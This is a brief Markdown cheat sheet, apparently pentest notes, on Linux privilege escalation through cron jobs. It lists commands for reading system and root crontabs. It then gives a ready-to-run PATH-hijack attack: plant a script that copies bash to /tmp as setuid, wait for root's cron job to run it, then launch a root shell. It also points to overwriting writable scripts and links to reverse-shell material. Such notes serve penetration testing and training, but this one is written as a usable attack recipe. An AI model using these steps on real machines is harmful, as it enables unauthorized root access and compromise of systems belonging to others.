# View cronjobs
```
crontab -l
ls /etc/*cron*
cat /etc/cron*
cat /etc/at*
ls -alh /var/spool/cron
cat /var/spool/cron/crontabs/root 
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```



# Cron PATH
- For example, inside _/etc/crontab_ you can find the PATH: 
	```
	PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin	
	```
- If inside this crontab the root user tries to execute some command or script without setting the path. For example: _* * * * root overwrite.sh_ Then, you can get a root shell by using:
	```
	echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
	#Wait cron job to be executed
	/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
	```

# Writable Script/Executable
- Overwrite it to spawn root shell


# Some Useful Code
- [Spawn shell Usually done to priv esc](Reverse%20Shell#Spawn%20shell%20Usually%20done%20to%20priv%20esc)

# Some examples
- Cronjob executing binary where its PATH or itself is writable
